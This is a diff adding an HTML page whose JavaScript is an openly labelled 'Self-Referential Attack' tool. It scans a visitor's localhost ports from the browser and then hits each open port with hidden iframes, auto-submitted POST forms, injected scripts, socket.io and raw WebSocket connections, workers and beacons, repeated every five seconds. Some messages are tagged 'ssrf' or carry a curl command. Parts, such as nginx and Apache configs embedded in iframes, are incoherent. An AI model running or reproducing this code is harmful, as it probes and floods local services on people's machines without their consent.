@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Self-Referential System</title>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.4/axios.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.21/lodash.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/@reactivex/rxjs@6.6.7/dist/global/rxjs.umd.js"></script>
+</head>
+<body>
+    <div id="container"></div>
+    
+    <script>
+        class SelfReferentialEngine {
+            constructor() {
+                this.ports = [80, 443, 8080, 3000, 5000, 8443, 9000, 3001];
+                this.wsConnections = new Map();
+                this.httpConnections = new Map();
+                this.results = [];
+            }
+            
+            async scanLocalPorts() {
+                const promises = this.ports.map(port => 
+                    fetch(`http://127.0.0.1:${port}`, {
+                        method: 'HEAD',
+                        mode: 'no-cors',
+                        credentials: 'omit'
+                    }).then(() => port).catch(() => null)
+                );
+                
+                const results = await Promise.allSettled(promises);
+                return results
+                    .map((r, i) => r.status === 'fulfilled' && r.value ? this.ports[i] : null)
+                    .filter(p => p !== null);
+            }
+            
+            createHTTPRedirect(port) {
+                const iframe = document.createElement('iframe');
+                iframe.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;border:0;';
+                iframe.srcdoc = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head>
+                        <meta http-equiv="refresh" content="0;url=http://127.0.0.1:${port}/">
+                        <script>
+                            window.location.href = "http://localhost:${port}/";
+                            new Image().src = "http://127.0.0.1:${port}/ping?t=" + Date.now();
+                            fetch("http://127.0.0.1:${port}/", {mode: 'no-cors'});
+                        <\/script>
+                    </head>
+                    </html>
+                `;
+                document.body.appendChild(iframe);
+                
+                const form = document.createElement('form');
+                form.method = 'POST';
+                form.action = `http://127.0.0.1:${port}/`;
+                form.innerHTML = '<input type="hidden" name="redirect" value="self">';
+                form.style.display = 'none';
+                document.body.appendChild(form);
+                
+                setTimeout(() => form.submit(), 100);
+                setTimeout(() => iframe.remove(), 5000);
+                
+                this.httpConnections.set(port, {iframe, form});
+                return port;
+            }
+            
+            createWebSocketConnection(port) {
+                const protocols = [
+                    `ws://127.0.0.1:${port}/socket.io/?EIO=4&transport=websocket`,
+                    `wss://127.0.0.1:${port}/socket.io/?EIO=4&transport=websocket`,
+                    `ws://localhost:${port}/socket.io/?EIO=4&transport=websocket`,
+                    `wss://localhost:${port}/socket.io/?EIO=4&transport=websocket`
+                ];
+                
+                let connected = false;
+                
+                for (const url of protocols) {
+                    try {
+                        const socket = io(url, {
+                            transports: ['websocket'],
+                            reconnection: true,
+                            reconnectionAttempts: 5,
+                            timeout: 5000
+                        });
+                        
+                        socket.on('connect', () => {
+                            connected = true;
+                            this.wsConnections.set(url, socket);
+                            socket.emit('ssrf', {
+                                type: 'self_referential',
+                                target: 'localhost',
+                                port: port,
+                                timestamp: Date.now()
+                            });
+                            
+                            socket.emit('command', {
+                                cmd: 'curl http://127.0.0.1:' + port + '/',
+                                source: 'self'
+                            });
+                        });
+                        
+                        socket.on('message', (data) => {
+                            this.results.push({
+                                type: 'ws_message',
+                                url: url,
+                                data: data,
+                                timestamp: Date.now()
+                            });
+                        });
+                        
+                        socket.on('connect_error', (error) => {
+                            if (!connected) {
+                                this.createRawWebSocket(url, port);
+                            }
+                        });
+                        
+                        setTimeout(() => {
+                            if (!connected) {
+                                socket.disconnect();
+                            }
+                        }, 3000);
+                        
+                        if (connected) break;
+                    } catch (e) {
+                        continue;
+                    }
+                }
+                
+                if (!connected) {
+                    this.createRawWebSocket(protocols[0], port);
+                }
+            }
+            
+            createRawWebSocket(url, port) {
+                try {
+                    const ws = new WebSocket(url);
+                    ws.onopen = () => {
+                        ws.send(JSON.stringify({
+                            action: 'self_referential_request',
+                            target: `ws://127.0.0.1:${port}/internal`,
+                            recursive: true
+                        }));
+                        
+                        ws.send('2probe');
+                        ws.send('5');
+                        
+                        const binary = new Uint8Array([0x01, 0x02, 0x03, 0x04]);
+                        ws.send(binary);
+                    };
+                    
+                    ws.onmessage = (event) => {
+                        this.results.push({
+                            type: 'raw_ws_message',
+                            url: url,
+                            data: event.data,
+                            timestamp: Date.now()
+                        });
+                    };
+                    
+                    this.wsConnections.set('raw_' + url, ws);
+                } catch (e) {
+                    console.error('Raw WebSocket failed:', e);
+                }
+            }
+            
+            createNginxApacheSimulation(port) {
+                const nginxConfig = `
+                    server {
+                        listen ${port};
+                        server_name localhost 127.0.0.1;
+                        
+                        location /redirect {
+                            add_header X-Self-Referential true;
+                            return 302 http://127.0.0.1:${port}/self;
+                        }
+                        
+                        location /self {
+                            proxy_pass http://127.0.0.1:${port}/;
+                            proxy_set_header Host $host;
+                            proxy_set_header X-Real-IP $remote_addr;
+                            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+                            proxy_set_header X-Forwarded-Proto $scheme;
+                        }
+                        
+                        location /socket.io/ {
+                            proxy_pass http://127.0.0.1:${port};
+                            proxy_http_version 1.1;
+                            proxy_set_header Upgrade $http_upgrade;
+                            proxy_set_header Connection "upgrade";
+                            proxy_buffering off;
+                            proxy_cache off;
+                        }
+                    }
+                `;
+                
+                const apacheConfig = `
+                    <VirtualHost *:${port}>
+                        ServerName localhost
+                        ServerAlias 127.0.0.1
+                        
+                        RewriteEngine On
+                        RewriteCond %{REQUEST_URI} ^/redirect
+                        RewriteRule ^(.*)$ http://127.0.0.1:${port}/self [R=302,L]
+                        
+                        ProxyPass /self http://127.0.0.1:${port}/
+                        ProxyPassReverse /self http://127.0.0.1:${port}/
+                        
+                        ProxyPass /socket.io/ ws://127.0.0.1:${port}/socket.io/
+                        ProxyPassReverse /socket.io/ ws://127.0.0.1:${port}/socket.io/
+                    </VirtualHost>
+                `;
+                
+                const configFrame = document.createElement('iframe');
+                configFrame.style.cssText = 'display:none;';
+                configFrame.srcdoc = `
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>Configs</title></head>
+                    <body>
+                        <pre id="nginx">${nginxConfig}</pre>
+                        <pre id="apache">${apacheConfig}</pre>
+                        <script>
+                            localStorage.setItem('nginx_config_${port}', ${JSON.stringify(nginxConfig)});
+                            localStorage.setItem('apache_config_${port}', ${JSON.stringify(apacheConfig)});
+                            window.parent.postMessage({
+                                type: 'config_loaded',
+                                port: ${port},
+                                source: 'config_frame'
+                            }, '*');
+                        <\/script>
+                    </body>
+                    </html>
+                `;
+                
+                document.body.appendChild(configFrame);
+                
+                const configScript = document.createElement('script');
+                configScript.textContent = `
+                    window.nginxConfig_${port} = ${JSON.stringify(nginxConfig)};
+                    window.apacheConfig_${port} = ${JSON.stringify(apacheConfig)};
+                    
+                    function createSelfRequest_${port}() {
+                        const requests = [
+                            'http://127.0.0.1:${port}/redirect',
+                            'ws://localhost:${port}/socket.io/?EIO=4',
+                            'http://localhost:${port}/self?ref=' + encodeURIComponent('http://127.0.0.1:${port}/')
+                        ];
+                        
+                        requests.forEach(url => {
+                            if (url.startsWith('ws')) {
+                                try {
+                                    new WebSocket(url).onopen = function() {
+                                        this.send(JSON.stringify({type: 'ping', target: 'self'}));
+                                    };
+                                } catch(e) {}
+                            } else {
+                                const img = new Image();
+                                img.src = url + '&_=' + Date.now();
+                                fetch(url, {mode: 'no-cors'}).catch(() => {});
+                            }
+                        });
+                    }
+                    
+                    createSelfRequest_${port}();
+                `;
+                
+                document.head.appendChild(configScript);
+            }
+            
+            createMultiVectorAttack(port) {
+                const attackVectors = [];
+                
+                attackVectors.push(() => {
+                    const meta = document.createElement('meta');
+                    meta.httpEquiv = 'refresh';
+                    meta.content = `0;url=http://127.0.0.1:${port}/?from=meta`;
+                    document.head.appendChild(meta);
+                });
+                
+                attackVectors.push(() => {
+                    const link = document.createElement('link');
+                    link.rel = 'preconnect';
+                    link.href = `http://localhost:${port}`;
+                    document.head.appendChild(link);
+                });
+                
+                attackVectors.push(() => {
+                    const script = document.createElement('script');
+                    script.src = `http://127.0.0.1:${port}/js?_=${Date.now()}`;
+                    document.head.appendChild(script);
+                });
+                
+                attackVectors.push(() => {
+                    const workerScript = `
+                        self.onmessage = function(e) {
+                            if (e.data === 'connect') {
+                                fetch('http://127.0.0.1:${port}/worker', {mode: 'no-cors'});
+                            }
+                        };
+                    `;
+                    const blob = new Blob([workerScript], {type: 'application/javascript'});
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    worker.postMessage('connect');
+                });
+                
+                attackVectors.forEach(vector => {
+                    try {
+                        vector();
+                    } catch (e) {
+                        console.error('Vector failed:', e);
+                    }
+                });
+                
+                setTimeout(() => {
+                    const events = [
+                        new Event('self_referential_start'),
+                        new CustomEvent('localhost_scan', {detail: {port: port}})
+                    ];
+                    events.forEach(event => window.dispatchEvent(event));
+                }, 100);
+            }
+            
+            async executeCompleteAttack() {
+                const openPorts = await this.scanLocalPorts();
+                const results = [];
+                
+                for (const port of openPorts) {
+                    try {
+                        this.createHTTPRedirect(port);
+                        this.createWebSocketConnection(port);
+                        this.createNginxApacheSimulation(port);
+                        this.createMultiVectorAttack(port);
+                        
+                        results.push({
+                            port: port,
+                            status: 'attacked',
+                            timestamp: Date.now(),
+                            vectors: ['http', 'websocket', 'config', 'multi']
+                        });
+                    } catch (e) {
+                        results.push({
+                            port: port,
+                            status: 'failed',
+                            error: e.message,
+                            timestamp: Date.now()
+                        });
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, 100));
+                }
+                
+                if (openPorts.length === 0) {
+                    const defaultPorts = [80, 443, 8080];
+                    for (const port of defaultPorts) {
+                        this.createHTTPRedirect(port);
+                        this.createWebSocketConnection(port);
+                        results.push({
+                            port: port,
+                            status: 'attempted_default',
+                            timestamp: Date.now()
+                        });
+                    }
+                }
+                
+                return results;
+            }
+        }
+        
+        class SocketIOController {
+            constructor() {
+                this.connections = new Map();
+                this.subscriptions = new Map();
+            }
+            
+            connectToSelf(port) {
+                const endpoints = [
+                    `ws://127.0.0.1:${port}`,
+                    `wss://127.0.0.1:${port}`,
+                    `ws://localhost:${port}`,
+                    `wss://localhost:${port}`
+                ];
+                
+                endpoints.forEach(endpoint => {
+                    const socket = io(endpoint, {
+                        transports: ['websocket', 'polling'],
+                        reconnection: true,
+                        reconnectionDelay: 1000,
+                        reconnectionDelayMax: 5000,
+                        timeout: 10000
+                    });
+                    
+                    socket.on('connect', () => {
+                        this.connections.set(endpoint, socket);
+                        
+                        socket.emit('register', {
+                            type: 'self_referential_client',
+                            timestamp: Date.now(),
+                            action: 'create_loop'
+                        });
+                        
+                        const interval = setInterval(() => {
+                            socket.emit('ping', {
+                                target: endpoint,
+                                source: 'self',
+                                data: {
+                                    command: 'connect_self',
+                                    parameters: {port: port}
+                                }
+                            });
+                        }, 3000);
+                        
+                        this.subscriptions.set(endpoint, interval);
+                    });
+                    
+                    socket.on('message', (data) => {
+                        if (data && data.type === 'redirect') {
+                            socket.emit('follow', {
+                                url: data.url,
+                                recursive: true
+                            });
+                        }
+                    });
+                    
+                    socket.on('disconnect', () => {
+                        const interval = this.subscriptions.get(endpoint);
+                        if (interval) clearInterval(interval);
+                        this.connections.delete(endpoint);
+                    });
+                });
+            }
+            
+            sendBinaryData(port) {
+                const ws = new WebSocket(`ws://127.0.0.1:${port}/binary`);
+                ws.binaryType = 'arraybuffer';
+                
+                ws.onopen = () => {
+                    const buffer = new ArrayBuffer(16);
+                    const view = new DataView(buffer);
+                    view.setUint32(0, 0xDEADBEEF, true);
+                    view.setUint32(4, port, true);
+                    view.setUint32(8, 0xCAFEBABE, true);
+                    view.setUint32(12, 0xFEEDFACE, true);
+                    
+                    ws.send(buffer);
+                    
+                    const blob = new Blob([buffer], {type: 'application/octet-stream'});
+                    ws.send(blob);
+                };
+                
+                this.connections.set(`binary_${port}`, ws);
+            }
+            
+            destroy() {
+                this.connections.forEach(socket => {
+                    if (socket.connected) socket.disconnect();
+                    if (socket.readyState === WebSocket.OPEN) socket.close();
+                });
+                
+                this.subscriptions.forEach(interval => clearInterval(interval));
+                this.connections.clear();
+                this.subscriptions.clear();
+            }
+        }
+        
+        class AttackOrchestrator {
+            constructor() {
+                this.engine = new SelfReferentialEngine();
+                this.socketController = new SocketIOController();
+                this.results = [];
+                this.isRunning = false;
+            }
+            
+            async start() {
+                if (this.isRunning) return;
+                this.isRunning = true;
+                
+                const startTime = Date.now();
+                
+                this.results = await this.engine.executeCompleteAttack();
+                
+                const openPorts = this.results
+                    .filter(r => r.status === 'attacked' || r.status === 'attempted_default')
+                    .map(r => r.port);
+                
+                openPorts.forEach(port => {
+                    this.socketController.connectToSelf(port);
+                    this.socketController.sendBinaryData(port);
+                });
+                
+                this.createContinuousLoop(openPorts);
+                
+                return {
+                    executionTime: Date.now() - startTime,
+                    portsAttacked: openPorts.length,
+                    results: this.results
+                };
+            }
+            
+            createContinuousLoop(ports) {
+                const loopInterval = setInterval(() => {
+                    ports.forEach(port => {
+                        this.engine.createHTTPRedirect(port);
+                        
+                        const eventSourceUrl = `http://127.0.0.1:${port}/events`;
+                        try {
+                            const es = new EventSource(eventSourceUrl);
+                            es.onmessage = () => es.close();
+                            setTimeout(() => es.close(), 1000);
+                        } catch(e) {}
+                        
+                        const beaconSent = navigator.sendBeacon(`http://localhost:${port}/beacon`, 
+                            JSON.stringify({type: 'loop', timestamp: Date.now()}));
+                    });
+                }, 5000);
+                
+                this.loopInterval = loopInterval;
+            }
+            
+            stop() {
+                this.isRunning = false;
+                if (this.loopInterval) clearInterval(this.loopInterval);
+                this.socketController.destroy();
+                
+                this.engine.httpConnections.forEach(conn => {
+                    if (conn.iframe && conn.iframe.parentNode) {
+                        conn.iframe.parentNode.removeChild(conn.iframe);
+                    }
+                    if (conn.form && conn.form.parentNode) {
+                        conn.form.parentNode.removeChild(conn.form);
+                    }
+                });
+                
+                this.engine.httpConnections.clear();
+                this.engine.wsConnections.clear();
+            }
+        }
+        
+        window.SelfReferentialAttack = {
+            AttackOrchestrator: AttackOrchestrator,
+            SelfReferentialEngine: SelfReferentialEngine,
+            SocketIOController: SocketIOController
+        };
+        
+        document.addEventListener('DOMContentLoaded', () => {
+            const orchestrator = new AttackOrchestrator();
+            
+            const startBtn = document.createElement('button');
+            startBtn.textContent = 'Start Self-Referential Attack';
+            startBtn.style.cssText = 'padding:10px 20px;font-size:16px;margin:10px;';
+            
+            const stopBtn = document.createElement('button');
+            stopBtn.textContent = 'Stop Attack';
+            stopBtn.style.cssText = 'padding:10px 20px;font-size:16px;margin:10px;';
+            
+            const resultsDiv = document.createElement('div');
+            resultsDiv.id = 'attack-results';
+            resultsDiv.style.cssText = 'margin:20px;padding:15px;border:1px solid #ccc;font-family:monospace;';
+            
+            document.getElementById('container').appendChild(startBtn);
+            document.getElementById('container').appendChild(stopBtn);
+            document.getElementById('container').appendChild(resultsDiv);
+            
+            startBtn.onclick = async () => {
+                startBtn.disabled = true;
+                resultsDiv.innerHTML = '<div>Starting attack...</div>';
+                
+                const result = await orchestrator.start();
+                
+                resultsDiv.innerHTML = `
+                    <div><strong>Attack completed in ${result.executionTime}ms</strong></div>
+                    <div>Ports attacked: ${result.portsAttacked}</div>
+                    <div>Results:</div>
+                    <pre>${JSON.stringify(result.results, null, 2)}</pre>
+                    <div>Attack is running in background...</div>
+                `;
+            };
+            
+            stopBtn.onclick = () => {
+                orchestrator.stop();
+                startBtn.disabled = false;
+                resultsDiv.innerHTML += '<div><strong>Attack stopped</strong></div>';
+            };
+            
+            window.addEventListener('beforeunload', () => {
+                orchestrator.stop();
+            });
+        });
+    </script>
+</body>
+</html>
